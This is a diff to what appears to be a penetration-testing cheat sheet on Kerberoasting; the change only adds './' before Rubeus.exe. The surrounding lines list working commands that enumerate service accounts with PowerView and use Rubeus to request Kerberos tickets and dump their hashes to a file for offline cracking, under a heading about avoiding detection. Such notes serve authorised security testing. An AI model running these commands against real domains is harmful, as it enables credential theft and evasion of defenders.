@@ -30,7 +30,7 @@ Get-DomainUser -SPN | select samaccountname,serviceprincipalname
 ```
 
 ```
-Rubeus.exe kerberoast /stats
+./Rubeus.exe kerberoast /stats
 ```
 
 #### Reguest a TGS
@@ -44,8 +44,8 @@ Request-SPNTicket "<SPN>"
 ```
 
 ```
-Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain:<FQDN DOMAIN> /outfile:kerberoast_hashes.txt
-Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
+./Rubeus.exe kerberoast /user:<SERVICEACCOUNT> /simple /domain:<FQDN DOMAIN> /outfile:kerberoast_hashes.txt
+./Rubeus.exe kerberoast /rc4opsec /outfile:kerberoast_hashes.txt
 ```
 
 #### Request TGS Avoid detection
